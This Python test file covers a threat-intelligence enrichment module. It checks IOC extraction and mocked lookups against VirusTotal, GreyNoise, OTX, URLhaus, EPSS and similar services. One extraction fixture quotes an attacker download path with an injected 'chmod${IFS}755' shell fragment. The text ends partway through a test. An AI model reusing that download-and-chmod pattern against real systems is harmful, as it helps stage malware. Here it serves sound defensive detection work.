from unittest.mock import MagicMock, patch

import pytest

from hecate_agent.orchestrator.enrichment import (
    _CRTSH_CACHE,
    _IPINFO_CACHE,
    _PDNS_CACHE,
    _SPUR_CACHE,
    _TOR_EXIT_CACHE,
    _URLSCAN_CACHE,
    _format_pdns_date,
    _get_apex_domain,
    _get_tor_exit_nodes,
    _normalize_pdns_timestamp,
    extract_http_transactions,
    extract_indicators,
    extract_ipinfo_context,
    extract_sibling_domains_from_crtsh,
    extract_spur_context,
    extract_web_lure_payloads,
    generate_enrichment_summary,
    generate_transaction_sigma_rules,
    is_tor_exit_node,
    poll_urlscan_result,
    query_anonymity_proxy_ip,
    query_crtsh_domain,
    query_ipinfo_ip,
    query_passive_dns,
    query_passive_dns_domain,
    query_spur_ip,
    query_tor_exit,
    query_urlscan_domain,
    query_urlscan_url,
    query_vt_hash,
    submit_urlscan_detonation,
)


@pytest.fixture(autouse=True)
def _isolate_summary_providers(request, monkeypatch):
    """Aggregation tests opt into their own providers instead of calling every API."""
    if not request.node.name.startswith("test_generate_enrichment_summary_includes_"):
        return
    from hecate_agent.orchestrator import enrichment

    for name, value in vars(enrichment).copy().items():
        if name.startswith("query_") and callable(value):
            monkeypatch.setattr(enrichment, name, MagicMock(return_value={} if name.endswith("_batch") else ""))


def test_extract_indicators():
    text = "Hash 35dd164a7f5d8b42b9870c7009f7425b1c8cb771280c9e6c525e09f3dd13c2cc. A domain is evil.shop. Also benign github.com. Exploit CVE-2024-3272 and cve-2021-44228."
    inds = extract_indicators(text)
    assert "35dd164a7f5d8b42b9870c7009f7425b1c8cb771280c9e6c525e09f3dd13c2cc" in inds["hashes"]
    assert "evil.shop" in inds["domains"]
    assert "github.com" not in inds["domains"]
    assert "CVE-2024-3272" in inds["cves"]
    assert "CVE-2021-44228" in inds["cves"]


def test_extract_indicators_defanged_and_cctlds():
    text = (
        "Adversary staged payload at 96.9.125[.]52 and chinadigitaltimes[.]top.\n"
        "C2 resolved at hub.zoom.com.kg and sync-telemetry.top.\n"
        "Older infra: hxxps://malicious[.]co[.]uk/gate."
    )
    inds = extract_indicators(text)
    assert "96.9.125.52" in inds["ips"]
    assert "chinadigitaltimes.top" in inds["domains"]
    assert "hub.zoom.com.kg" in inds["domains"]
    # Ensure it did NOT truncate to hub.zoom.com
    assert "hub.zoom.com" not in inds["domains"]
    assert "sync-telemetry.top" in inds["domains"]
    assert "malicious.co.uk" in inds["domains"]


def test_extract_indicators_excludes_permission_scopes():
    text = (
        "Attacker registered an application with permissions: User.ReadWrite.All, "
        "RoleManagement.ReadWrite.Directory, Directory.Read.All and Mail.Send. "
        "Real domain: adversary-c2.shop"
    )
    inds = extract_indicators(text)
    assert "adversary-c2.shop" in inds["domains"]
    assert "User.ReadWrite.All" not in inds["domains"]
    assert "RoleManagement.ReadWrite.Directory" not in inds["domains"]
    assert "Directory.Read.All" not in inds["domains"]
    assert "Mail.Send" not in inds["domains"]


def test_get_apex_domain():
    assert _get_apex_domain("hub.zoom.com.kg") == "zoom.com.kg"
    assert _get_apex_domain("c2.evil.co.uk") == "evil.co.uk"
    assert _get_apex_domain("sync-telemetry.top") == "sync-telemetry.top"
    assert _get_apex_domain("sub.corp.example.com") == "example.com"


def test_extract_indicators_filters_publisher_and_reference_domains():
    text = (
        "Adversary C2 was n.alox.one with fallback to evil.shop.\n"
        "References: https://blackpointcyber.com/blog/variola-from-clickfix-to-modular-implant/\n"
        "Read more at https://unit42.paloaltonetworks.com/research/threat-brief/\n"
        "Also see https://www.mandiant.com/resources/blog/apt41-report"
    )
    inds = extract_indicators(text)
    assert "n.alox.one" in inds["domains"]
    assert "evil.shop" in inds["domains"]
    assert "blackpointcyber.com" not in inds["domains"]
    assert "unit42.paloaltonetworks.com" not in inds["domains"]
    assert "mandiant.com" not in inds["domains"]
    assert "paloaltonetworks.com" not in inds["domains"]


def test_extract_indicators_treats_link_only_hosts_as_citations():
    """H-0830: the advisories a report hyperlinks became DNS and proxy IOCs,
    and a NetScaler build number became an address."""
    text = (
        "Fixed in 13.1.37.283 and later. See [NVD](https://nvd.nist.gov/vuln/detail/cve-1) and "
        "[the vendor bulletin](https://helpx.adobe.com/security/apsb.html). The implant came from "
        "hxxp://209.141.43[.]95/files/kw2;chmod${IFS}755 and beaconed to evil-c2[.]xyz, "
        "whose panel is [linked here](https://evil-c2.xyz/panel)."
    )
    inds = extract_indicators(text)
    assert inds["ips"] == ["209.141.43.95"]
    assert inds["domains"] == ["evil-c2.xyz"]
    assert sorted(inds["urls"]) == ["http://209.141.43.95/files/kw2", "https://evil-c2.xyz/panel"]


@patch("hecate_agent.orchestrator.enrichment.httpx.get")
@patch("hecate_agent.orchestrator.enrichment.httpx.post")
def test_generate_enrichment_summary(mock_post, mock_get):
    mock_vt = MagicMock()
    mock_vt.status_code = 200
    mock_vt.json.return_value = {
        "data": {"attributes": {"last_analysis_stats": {"malicious": 5, "suspicious": 1, "harmless": 50}}}
    }

    mock_shodan = MagicMock()
    mock_shodan.status_code = 200
    mock_shodan.json.return_value = {"ports": [80, 443], "vulns": ["CVE-2023-1234"]}

    mock_tf = MagicMock()
    mock_tf.status_code = 200
    mock_tf.json.return_value = {
        "query_status": "ok",
        "data": [{"threat_type": "botnet", "malware_printable": "Mirai", "tags": ["IoT"]}],
    }

    mock_mb = MagicMock()
    mock_mb.status_code = 200
    mock_mb.json.return_value = {
        "query_status": "ok",
        "data": [
            {
                "signature": "Mirai",
                "file_type": "elf",
                "delivery_method": "exploit",
                "yara_rules": [{"rule_name": "Mirai_Botnet"}],
            }
        ],
    }

    mock_abuseipdb = MagicMock()
    mock_abuseipdb.status_code = 200
    mock_abuseipdb.json.return_value = {
        "data": {
            "abuseConfidenceScore": 95,
            "totalReports": 34,
            "isp": "DigitalOcean, LLC",
            "usageType": "Data Center/Web Hosting/Transit",
            "countryCode": "US",
        }
    }

    mock_rdap = MagicMock()
    mock_rdap.status_code = 200
    mock_rdap.json.return_value = {
        "events": [{"eventAction": "registration", "eventDate": "2024-01-15T00:00:00Z"}],
        "entities": [{"roles": ["registrar"], "vcardArray": ["vcard", [["fn", {}, "text", "Namecheap Inc."]]]}],
    }

    mock_misp = MagicMock()
    mock_misp.status_code = 200
    mock_misp.json.return_value = {"response": [{"Event": {"info": "Test Event"}}]}

    def get_side_effect(*args, **kwargs):
        url = args[0]
        if "virustotal" in url:
            return mock_vt
        if "shodan" in url:
            return mock_shodan
        if "greynoise" in url:
            mock_gn = MagicMock(status_code=200)
            mock_gn.json.return_value = {"noise": False, "riot": True, "classification": "benign", "name": "Google Public DNS"}
            return mock_gn
        if "abuseipdb" in url:
            return mock_abuseipdb
        if "rdap.org" in url:
            return mock_rdap
        if "api.first.org" in url:
            mock_epss = MagicMock(status_code=200)
            mock_epss.json.return_value = {
                "status": "OK",
                "data": [{"cve": "CVE-2023-1234", "epss": "0.92500", "percentile": "0.98500", "date": "2026-10-16"}],
            }
            return mock_epss
        if "alienvault.com" in url or "otx" in url:
            mock_otx = MagicMock(status_code=200)
            mock_otx.json.return_value = {
                "pulse_info": {
                    "count": 2,
                    "pulses": [{"name": "Mirai C2 Infrastructure", "adversary": "ThreatGroup-1", "tags": ["botnet", "iot"]}],
                }
            }
            return mock_otx
        if "hybrid-analysis" in url:
            mock_ha = MagicMock(status_code=200)
            mock_ha.json.return_value = {
                "threat_score": 100,
                "verdict": "malicious",
                "vx_family": "Mirai",
                "type_short": "elf",
                "reports": [],
            }
            return mock_ha
        if "censys" in url:
            mock_censys = MagicMock()
            mock_censys.status_code = 404
            return mock_censys
        if "api.osv.dev" in url:
            mock_osv = MagicMock(status_code=200)
            mock_osv.json.return_value = {
                "id": "CVE-2023-1234",
                "summary": "Sample open source vulnerability in pkg-xyz",
                "affected": [{"package": {"name": "pkg-xyz", "ecosystem": "PyPI"}}],
                "aliases": ["GHSA-1234-5678-90ab"],
                "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}],
            }
            return mock_osv
        return MagicMock(status_code=404)

    def post_side_effect(*args, **kwargs):
        url = args[0]
        if "threatfox" in url:
            return mock_tf
        if "mb-api.abuse.ch" in url:
            return mock_mb
        if "misp" in url:
            return mock_misp
        return MagicMock(status_code=404)

    mock_get.side_effect = get_side_effect
    mock_post.side_effect = post_side_effect

    with patch("hecate_agent.orchestrator.enrichment._setting") as mock_set:
        mock_set.side_effect = lambda k, d="": "test-key" if "KEY" in k or "TOKEN" in k else d
        text = "Hash 35dd164a7f5d8b42b9870c7009f7425b1c8cb771280c9e6c525e09f3dd13c2cc and IP 8.8.8.8 and domain c2.evil.xyz and vuln CVE-2023-1234"
        summary = generate_enrichment_summary(text)

    assert "🛡️ Automated Threat Enrichment" in summary
    assert "Hash 35dd164a7f5d8b42b9870c7009f7425b1c8cb771280c9e6c525e09f3dd13c2cc" in summary
    assert "IP 8.8.8.8" in summary
    assert "Domain c2.evil.xyz" in summary
    assert "Vulnerability CVE-2023-1234" in summary
    assert "FIRST EPSS (Exploit Prediction)" in summary
    assert "OSV.dev (Open Source Supply Chain)" in summary
    assert "pkg-xyz" in summary
    assert "AlienVault OTX" in summary
    assert "Hybrid Analysis (Falcon Sandbox)" in summary
    assert "Mirai C2 Infrastructure" in summary
    assert "92.50%" in summary
    assert "CRITICAL EXPLOIT PROBABILITY" in summary
    assert "Malicious hits: 5" in summary
    assert "Mirai" in summary
    assert "MalwareBazaar" in summary
    assert "AbuseIPDB" in summary
    assert "RDAP" in summary
    assert "Namecheap Inc." in summary


def test_query_vt_hash_no_api_key(monkeypatch):
    monkeypatch.delenv("VT_API_KEY", raising=False)
    assert query_vt_hash("hash") == "Not found or error."


def test_extract_vt_behavior_graph(monkeypatch):
    from hecate_agent.orchestrator.enrichment import extract_vt_behavior_graph

    monkeypatch.delenv("VT_API_KEY", raising=False)
    assert extract_vt_behavior_graph("samplehash") == {}

    monkeypatch.setenv("VT_API_KEY", "test-key")
    with patch("hecate_agent.orchestrator.enrichment.httpx.get") as mock_get:
        mock_resp = MagicMock(status_code=200)
        mock_resp.json.return_value = {
            "data": {
                "tags": ["PERSISTENCE", "OBFUSCATED"],
                "mitre_attack_techniques": [
                    {"id": "T1059.001", "signature_description": "PowerShell Execution"},
                    {"id": "T1543.003", "signature_description": "Windows Service"},
                ],
                "ip_traffic": [{"destination_ip": "198.51.100.22", "destination_port": 8443}],
                "dns_lookups": [{"hostname": "c2-sync-domain.top"}],
                "files_dropped": [{"path": "C:\\Windows\\Temp\\beacon.exe"}],
            }
        }
        mock_get.return_value = mock_resp

        bg = extract_vt_behavior_graph("samplehash")
        assert "PERSISTENCE" in bg["tags"]
        assert bg["mitre_techniques"][0]["id"] == "T1059.001"
        assert bg["contacted_ips"] == ["198.51.100.22"]
        assert bg["contacted_domains"] == ["c2-sync-domain.top"]
        assert "C:\\Windows\\Temp\\beacon.exe" in bg["dropped_files"]


def test_extract_greynoise_context(monkeypatch):
    from hecate_agent.orchestrator.enrichment import extract_greynoise_context

    monkeypatch.delenv("GREYNOISE_API_KEY", raising=False)
    res = extract_greynoise_context("8.8.8.8")
    assert res["classification"] == "unknown"

    monkeypatch.setenv("GREYNOISE_API_KEY", "test-key")
    with patch("hecate_agent.orchestrator.enrichment.httpx.get") as mock_get:
        # Mock benign scanner
        mock_resp = MagicMock(status_code=200)
        mock_resp.json.return_value = {
            "business_service_intelligence": {"found": False},
            "internet_scanner_intelligence": {
                "found": True,
                "classification": "benign",
                "actor": "ShadowServer.org",
                "tags": [{"name": "Ping Scanner"}],
            },
        }
        mock_get.return_value = mock_resp
        ctx = extract_greynoise_context("65.49.20.70")
        assert ctx["noise"] is True
        assert ctx["classification"] == "benign"
        assert ctx["actor"] == "ShadowServer.org"
        assert "Ping Scanner" in ctx["tags"]


def test_query_vt_domain(monkeypatch):
    from hecate_agent.orchestrator.enrichment import query_vt_domain

    with patch("hecate_agent.orchestrator.enrichment.httpx.get") as mock_get:
        mock_resp = MagicMock(status_code=200)
        mock_resp.json.return_value = {
            "data": {
                "attributes": {
                    "last_analysis_stats": {"malicious": 8},
                    "registrar": "NameCheap",
                    "categories": {"Forcepoint": "malicious"},
                }
            }
        }
        mock_get.return_value = mock_resp
        monkeypatch.setenv("VT_API_KEY", "test-key")
        res = query_vt_domain("bad-domain.top")
        assert "Malicious hits: 8" in res
        assert "NameCheap" in res


def test_query_greynoise_ip(monkeypatch):
    from hecate_agent.orchestrator.enrichment import query_greynoise_ip

    monkeypatch.delenv("GREYNOISE_API_KEY", raising=False)
    assert query_greynoise_ip("8.8.8.8") == "GREYNOISE_API_KEY not configured."

    with patch("hecate_agent.orchestrator.enrichment.httpx.get") as mock_get:
        # Test Community format
        mock_resp = MagicMock(status_code=200)
        mock_resp.json.return_value = {
            "noise": True,
            "riot": False,
            "classification": "malicious",
            "actor": "Mirai",
            "tags": ["Mirai", "Telnet Bruteforce"],
        }
        mock_get.return_value = mock_resp
        monkeypatch.setenv("GREYNOISE_API_KEY", "gn-test-key")
        res = query_greynoise_ip("1.2.3.4")
        assert "Mass Internet Scanner (malicious)" in res
        assert "Mirai" in res

        # Test v3 Enterprise format
        mock_resp_v3 = MagicMock(status_code=200)
        mock_resp_v3.json.return_value = {
            "ip": "198.235.24.237",
            "business_service_intelligence": {"found": None, "trust_level": ""},
            "internet_scanner_intelligence": {
                "found": True,
                "classification": "benign",
                "actor": "Cortex Xpanse",
                "tags": [{"name": "F5 BIG-IP Crawler"}, {"name": "Well-Known Scanner"}],
            },
        }
        mock_get.return_value = mock_resp_v3
        res_v3 = query_greynoise_ip("198.235.24.237")
        assert "Mass Internet Scanner (benign)" in res_v3
        assert "Cortex Xpanse" in res_v3
        assert "F5 BIG-IP Crawler" in res_v3

        # Test 404 unseen IP
        mock_resp_404 = MagicMock(status_code=404)
        mock_get.return_value = mock_resp_404
        res_404 = query_greynoise_ip("8.8.8.8")
        assert "No mass-internet scanning observed" in res_404


def test_query_malwarebazaar(monkeypatch):
    from hecate_agent.orchestrator.enrichment import query_malwarebazaar

    monkeypatch.delenv("ABUSECH_API_KEY", raising=False)
    assert query_malwarebazaar("hash123") == "ABUSECH_API_KEY not configured."

    monkeypatch.setenv("ABUSECH_API_KEY", "test-key")
    with patch("hecate_agent.orchestrator.enrichment.httpx.post") as mock_post:
        # Success with YARA
        mock_resp = MagicMock(status_code=200)
        mock_resp.json.return_value = {
            "query_status": "ok",
            "data": [
                {
                    "signature": "CobaltStrike",
                    "file_type": "exe",
                    "delivery_method": "phishing",
                    "yara_rules": [{"rule_name": "Cobalt_Strike_Beacon"}],
                }
            ],
        }
        mock_post.return_value = mock_resp
        res = query_malwarebazaar("hash123")
        assert "Family: CobaltStrike" in res
        assert "Type: exe" in res
        assert "Delivery: phishing" in res
        assert "YARA: Cobalt_Strike_Beacon" in res

        # Not found
        mock_resp_404 = MagicMock(status_code=200)
        mock_resp_404.json.return_value = {"query_status": "hash_not_found"}
        mock_post.return_value = mock_resp_404
        res_404 = query_malwarebazaar("hash999")
        assert "No sample found on MalwareBazaar." in res_404


def test_query_abuseipdb_ip(monkeypatch):
    from hecate_agent.orchestrator.enrichment import query_abuseipdb_ip

    monkeypatch.delenv("ABUSEIPDB_API_KEY", raising=False)
    assert query_abuseipdb_ip("1.2.3.4") == "ABUSEIPDB_API_KEY not configured."

    monkeypatch.setenv("ABUSEIPDB_API_KEY", "abuseipdb-key")
    with patch("hecate_agent.orchestrator.enrichment.httpx.get") as mock_get:
        mock_resp = MagicMock(status_code=200)
        mock_resp.json.return_value = {
            "data": {
                "abuseConfidenceScore": 100,
                "totalReports": 52,
                "isp": "OVH SAS",
                "usageType": "Data Center/Web Hosting/Transit",
                "countryCode": "FR",
            }
        }
        mock_get.return_value = mock_resp
        res = query_abuseipdb_ip("51.254.10.1")
        assert "Score: 100% (Reports: 52)" in res
        assert "ISP: OVH SAS" in res
        assert "Country: FR" in res

        # Rate limit
        mock_resp_429 = MagicMock(status_code=429)
        mock_get.return_value = mock_resp_429
        assert "rate limit exceeded" in query_abuseipdb_ip("51.254.10.1")


def test_query_rdap_domain():
    from hecate_agent.orchestrator.enrichment import query_rdap_domain

    with patch("hecate_agent.orchestrator.enrichment.httpx.get") as mock_get:
        mock_resp = MagicMock(status_code=200)
        mock_resp.json.return_value = {
            "events": [
                {"eventAction": "registration", "eventDate": "2020-05-10T12:00:00Z"},
                {"eventAction": "expiration", "eventDate": "2028-05-10T12:00:00Z"},
            ],
            "entities": [{"roles": ["registrar"], "vcardArray": ["vcard", [["fn", {}, "text", "GoDaddy.com, LLC"]]]}],
        }
        mock_get.return_value = mock_resp
        res = query_rdap_domain("subdomain.evil-target.com")
        assert "Registered: 2020-05-10" in res
        assert "GoDaddy.com, LLC" in res

        # Not found
        mock_resp_404 = MagicMock(status_code=404)
        mock_get.return_value = mock_resp_404
        assert "Domain not found on RDAP." in query_rdap_domain("unknown-domain.xyz")


def test_query_epss():
    from hecate_agent.orchestrator.enrichment import query_epss

    with patch("hecate_agent.orchestrator.enrichment.httpx.get") as mock_get:
        # Happy path - critical probability
        mock_resp = MagicMock(status_code=200)
        mock_resp.json.return_value = {
            "status": "OK",
            "data": [{"cve": "CVE-2024-3272", "epss": "0.98038", "percentile": "0.99911", "date": "2026-10-16"}],
        }
        mock_get.return_value = mock_resp
        res = query_epss("CVE-2024-3272")
        assert "98.04%" in res
        assert "CRITICAL EXPLOIT PROBABILITY" in res
        assert "99.9th percentile" in res
        assert "2026-10-16" in res

        # Not found / no score
        mock_resp_empty = MagicMock(status_code=200)
        mock_resp_empty.json.return_value = {"status": "OK", "data": []}
        mock_get.return_value = mock_resp_empty
        assert "No EPSS score published for CVE-2099-0001." in query_epss("CVE-2099-0001")

        # Invalid format
        assert "Invalid CVE identifier" in query_epss("not-a-cve")


def test_query_epss_batch():
    from hecate_agent.orchestrator.enrichment import query_epss_batch

    with patch("hecate_agent.orchestrator.enrichment.httpx.get") as mock_get:
        mock_resp = MagicMock(status_code=200)
        mock_resp.json.return_value = {
            "status": "OK",
            "data": [
                {"cve": "CVE-2024-3272", "epss": "0.98038", "percentile": "0.99911", "date": "2026-10-16"},
                {"cve": "CVE-2021-44228", "epss": "0.15000", "percentile": "0.85000", "date": "2026-10-16"},
            ],
        }
        mock_get.return_value = mock_resp
        results = query_epss_batch(["CVE-2024-3272", "CVE-2021-44228", "CVE-2099-1111"])
        assert "CVE-2024-3272" in results
        assert "CRITICAL EXPLOIT PROBABILITY" in results["CVE-2024-3272"]
        assert "CVE-2021-44228" in results
        assert "ELEVATED EXPLOIT PROBABILITY" in results["CVE-2021-44228"]
        assert "No EPSS score published for CVE-2099-1111." in results["CVE-2099-1111"]


def test_query_otx_ip_with_pulses_and_pdns():
    from hecate_agent.orchestrator.enrichment import query_otx_ip

    with patch("hecate_agent.orchestrator.enrichment._setting", return_value="otx-key"):
        with patch("hecate_agent.orchestrator.enrichment.httpx.get") as mock_get:

            def side_effect(url, **kwargs):
                if "passive_dns" in url:
                    mock_pdns = MagicMock(status_code=200)
                    mock_pdns.json.return_value = {
                        "passive_dns": [
                            {"hostname": "c2-node.malicious.net", "record_type": "A"},
                            {"hostname": "backup-relay.xyz", "record_type": "A"},
                        ]
                    }
                    return mock_pdns
                mock_gen = MagicMock(status_code=200)
                mock_gen.json.return_value = {
                    "pulse_info": {
                        "count": 5,
                        "pulses": [
                            {"name": "Cobalt Strike Infrastructure", "adversary": "APT29", "tags": ["c2", "cobalt strike"]},
                            {"name": "Red Team Operations", "adversary": "APT29", "tags": ["beacon"]},
                        ],
                    }
                }
                return mock_gen

            mock_get.side_effect = side_effect
            res = query_otx_ip("198.51.100.1")
            assert "5 Pulse(s)" in res
            assert "Cobalt Strike Infrastructure" in res
            assert "Adversary: APT29" in res
            assert "Tags: c2, cobalt strike, beacon" in res
            assert "Passive DNS: c2-node.malicious.net, backup-relay.xyz" in res


def test_query_otx_domain():
    from hecate_agent.orchestrator.enrichment import query_otx_domain

    with patch("hecate_agent.orchestrator.enrichment._setting", return_value="otx-key"):
        with patch("hecate_agent.orchestrator.enrichment.httpx.get") as mock_get:
            mock_resp = MagicMock(status_code=200)
            mock_resp.json.return_value = {
                "pulse_info": {
                    "count": 1,
                    "pulses": [{"name": "Lazarus FakeJob Campaign", "adversary": "Lazarus Group", "tags": ["phishing"]}],
                }
            }
            mock_get.return_value = mock_resp
            res = query_otx_domain("evil-domain.com")
            assert "1 Pulse(s)" in res
            assert "Lazarus FakeJob Campaign" in res
            assert "Adversary: Lazarus Group" in res


def test_query_otx_hash():
    from hecate_agent.orchestrator.enrichment import query_otx_hash

    with patch("hecate_agent.orchestrator.enrichment._setting", return_value="otx-key"):
        with patch("hecate_agent.orchestrator.enrichment.httpx.get") as mock_get:
            mock_resp = MagicMock(status_code=200)
            mock_resp.json.return_value = {
                "pulse_info": {
                    "count": 12,
                    "pulses": [
                        {"name": "AsyncRAT Payload Distribution", "adversary": "UAC-0050", "tags": ["rat", "asyncrat"]}
                    ],
                }
            }
            mock_get.return_value = mock_resp
            res = query_otx_hash("44d88612fea8a8f36de82e1278abb02f")
            assert "12 Pulse(s)" in res
            assert "AsyncRAT Payload Distribution" in res
            assert "Adversary: UAC-0050" in res


def test_query_otx_cve():
    from hecate_agent.orchestrator.enrichment import query_otx_cve

    with patch("hecate_agent.orchestrator.enrichment._setting", return_value="otx-key"):
        with patch("hecate_agent.orchestrator.enrichment.httpx.get") as mock_get:
            mock_resp = MagicMock(status_code=200)
            mock_resp.json.return_value = {
                "pulse_info": {
                    "count": 4,
                    "pulses": [
                        {"name": "skynox7: Proxyjacking Edge Devices", "adversary": "skynox7", "tags": ["proxyjacking"]}
                    ],
                }
            }
            mock_get.return_value = mock_resp
            res = query_otx_cve("CVE-2024-3272")
            assert "4 Pulse(s)" in res
            assert "skynox7: Proxyjacking Edge Devices" in res
            assert "Adversary: skynox7" in res


def test_query_otx_no_api_key():
    from hecate_agent.orchestrator.enrichment import query_otx_indicator

    with patch("hecate_agent.orchestrator.enrichment._setting", return_value=""):
        res = query_otx_indicator("IPv4", "198.51.100.1")
        assert res == "OTX_API_KEY not configured."


def test_query_otx_not_found():
    from hecate_agent.orchestrator.enrichment import query_otx_indicator

    with patch("hecate_agent.orchestrator.enrichment._setting", return_value="otx-key"):
        with patch("hecate_agent.orchestrator.enrichment.httpx.get") as mock_get:
            mock_resp = MagicMock(status_code=404)
            mock_get.return_value = mock_resp
            res = query_otx_indicator("domain", "clean-domain.test")
            assert res == "No record on OTX."


def test_query_feodotracker_ip_found():
    import time
    from hecate_agent.orchestrator.enrichment import _FEODO_CACHE, query_feodotracker_ip

    mock_data = {
        "198.51.100.1": {
            "ip_address": "198.51.100.1",
            "malware": "QakBot",
            "status": "online",
            "port": 443,
            "first_seen": "2026-10-15 12:00:00",
            "as_name": "EXAMPLE-ASN",
        }
    }
    _FEODO_CACHE["data"] = mock_data
    _FEODO_CACHE["ts"] = time.time()
    res = query_feodotracker_ip("198.51.100.1")
    assert "Botnet C2: QakBot" in res
    assert "Port: 443" in res
    assert "Status: online" in res
    assert "First Seen: 2026-10-15" in res
    assert "ASN: EXAMPLE-ASN" in res


def test_query_feodotracker_ip_clean():
    import time
    from hecate_agent.orchestrator.enrichment import _FEODO_CACHE, query_feodotracker_ip

    _FEODO_CACHE["data"] = {"198.51.100.1": {"malware": "Emotet"}}
    _FEODO_CACHE["ts"] = time.time()
    res = query_feodotracker_ip("8.8.8.8")
    assert res == "Not listed on Feodo Tracker (clean)."


def test_query_sslbl_fingerprint_found():
    import time
    from hecate_agent.orchestrator.enrichment import _SSLBL_CACHE, query_sslbl_fingerprint

    _SSLBL_CACHE["data"] = {
        "d83515431690184ba48f4be8be3e9594b2ee718d": ("Vidar C&C SSL Cert", "2026-10-10"),
        "65230654877f2fedd6a066928e08d6d8": ("JA3 AsyncRAT C2", "2026-10-12"),
    }
    _SSLBL_CACHE["ts"] = time.time()
    res_sha1 = query_sslbl_fingerprint("D83515431690184BA48F4BE8BE3E9594B2EE718D")
    assert "Vidar C&C SSL Cert" in res_sha1
    assert "Listed: 2026-10-10" in res_sha1

    res_ja3 = query_sslbl_fingerprint("65230654877f2fedd6a066928e08d6d8")
    assert "JA3 AsyncRAT C2" in res_ja3
    assert "Listed: 2026-10-12" in res_ja3


def test_query_sslbl_fingerprint_clean():
    import time
    from hecate_agent.orchestrator.enrichment import _SSLBL_CACHE, query_sslbl_fingerprint

    _SSLBL_CACHE["data"] = {"d83515431690184ba48f4be8be3e9594b2ee718d": ("Vidar", "2026-10-10")}
    _SSLBL_CACHE["ts"] = time.time()
    res = query_sslbl_fingerprint("e3b0c44298fc1c149afbf4c8996fb92427ae41e4")
    assert res == "Not listed on SSLBL (clean)."


def test_query_urlhaus_url(monkeypatch):
    from hecate_agent.orchestrator.enrichment import query_urlhaus_url

    monkeypatch.delenv("ABUSECH_API_KEY", raising=False)
    assert query_urlhaus_url("http://bad.com/exe") == "ABUSECH_API_KEY not configured."

    monkeypatch.setenv("ABUSECH_API_KEY", "test-key")
    with patch("hecate_agent.orchestrator.enrichment.httpx.post") as mock_post:
        # Test found URL
        mock_resp = MagicMock(status_code=200)
        mock_resp.json.return_value = {
            "query_status": "ok",
            "url_status": "online",
            "threat": "malware_download",
            "tags": ["Mozi", "elf"],
            "payloads": [{"signature": "Mozi", "file_type": "elf"}],
        }
        mock_post.return_value = mock_resp
        res = query_urlhaus_url("http://example-c2.com/malware.bin")
        assert "Status: online" in res
        assert "Threat: malware_download" in res
        assert "Payload: Mozi" in res
        assert "Tags: Mozi, elf" in res

        # Test no results
        mock_resp_clean = MagicMock(status_code=200)
        mock_resp_clean.json.return_value = {"query_status": "no_results"}
        mock_post.return_value = mock_resp_clean
        res_clean = query_urlhaus_url("http://clean-site.org/file.pdf")
        assert res_clean == "Not listed on URLhaus."

        # Test auth error
        mock_resp_401 = MagicMock(status_code=401)
        mock_post.return_value = mock_resp_401
        res_401 = query_urlhaus_url("http://bad.com/exe")
        assert "URLhaus Auth Error" in res_401


def test_query_urlhaus_host(monkeypatch):
    from hecate_agent.orchestrator.enrichment import query_urlhaus_host

    monkeypatch.setenv("ABUSECH_API_KEY", "test-key")
    with patch("hecate_agent.orchestrator.enrichment.httpx.post") as mock_post:
        mock_resp = MagicMock(status_code=200)
        mock_resp.json.return_value = {
            "query_status": "ok",
            "url_count": 8,
            "firstseen": "2026-10-14 10:00:00",
        }
        mock_post.return_value = mock_resp
        res = query_urlhaus_host("malicious-c2-host.com")
        assert "Malware host (8 URL(s))" in res
        assert "First seen: 2026-10-14" in res

        mock_resp_none = MagicMock(status_code=200)
        mock_resp_none.json.return_value = {"query_status": "no_results"}
        mock_post.return_value = mock_resp_none
        assert query_urlhaus_host("clean.org") == "Not listed on URLhaus."


def test_query_urlhaus_payload(monkeypatch):
    from hecate_agent.orchestrator.enrichment import query_urlhaus_payload

    monkeypatch.setenv("ABUSECH_API_KEY", "test-key")
    with patch("hecate_agent.orchestrator.enrichment.httpx.post") as mock_post:
        mock_resp = MagicMock(status_code=200)
        mock_resp.json.return_value = {
            "query_status": "ok",
            "signature": "RedLineStealer",
            "file_type": "exe",
            "url_count": 4,
        }
        mock_post.return_value = mock_resp
        res = query_urlhaus_payload("d41d8cd98f00b204e9800998ecf8427e")
        assert "Payload: RedLineStealer (exe)" in res
        assert "Seen on 4 URL(s)" in res

        mock_resp_clean = MagicMock(status_code=200)
        mock_resp_clean.json.return_value = {"query_status": "no_results"}
        mock_post.return_value = mock_resp_clean
        assert query_urlhaus_payload("d41d8cd98f00b204e9800998ecf8427e") == "No payload on URLhaus."


def test_extract_indicators_extracts_urls_and_filters_publishers():
    from hecate_agent.orchestrator.enrichment import extract_indicators

    text = (
        "Adversary downloaded malware from hxxp://evil-download.com/payload.exe and http://198.51.100.5/stage2.bin. "
        "Reference: https://www.mandiant.com/resources/blog/apt41-malware. "
        "See also report at https://unit42.paloaltonetworks.com/threat-report."
    )
    inds = extract_indicators(text)
    assert "urls" in inds
    # evil-download.com and 198.51.100.5 should be included
    assert any("evil-download.com/payload.exe" in u for u in inds["urls"])
    assert any("198.51.100.5/stage2.bin" in u for u in inds["urls"])
    # Mandiant and Palo Alto publisher URLs must be filtered out
    assert not any("mandiant.com" in u for u in inds["urls"])
    assert not any("paloaltonetworks.com" in u for u in inds["urls"])


def test_query_hybrid_analysis_no_key(monkeypatch):
    from hecate_agent.orchestrator.enrichment import query_hybrid_analysis

    monkeypatch.delenv("HYBRID_ANALYSIS_API_KEY", raising=False)
    monkeypatch.delenv("HA_API_KEY", raising=False)
    monkeypatch.delenv("FALCON_SANDBOX_API_KEY", raising=False)
    assert (
        query_hybrid_analysis("35dd164a7f5d8b42b9870c7009f7425b1c8cb771280c9e6c525e09f3dd13c2cc")
        == "HYBRID_ANALYSIS_API_KEY not configured."
    )


def test_query_hybrid_analysis_invalid_hash(monkeypatch):
    from hecate_agent.orchestrator.enrichment import query_hybrid_analysis

    monkeypatch.setenv("HYBRID_ANALYSIS_API_KEY", "ha-test-key")
    res = query_hybrid_analysis("invalid-hash!")
    assert "Invalid hash format" in res


def test_query_hybrid_analysis_success(monkeypatch):
    from hecate_agent.orchestrator.enrichment import query_hybrid_analysis

    monkeypatch.setenv("HYBRID_ANALYSIS_API_KEY", "ha-test-key")
    with patch("hecate_agent.orchestrator.enrichment.httpx.get") as mock_get:

        def get_side_effect(url, *args, **kwargs):
            if "overview" in url and "report" not in url:
                mock_ov = MagicMock(status_code=200)
                mock_ov.json.return_value = {
                    "threat_score": 100,
                    "threat_level": 3,
                    "verdict": "malicious",
                    "vx_family": "AsyncRAT",
                    "type_short": "peexe",
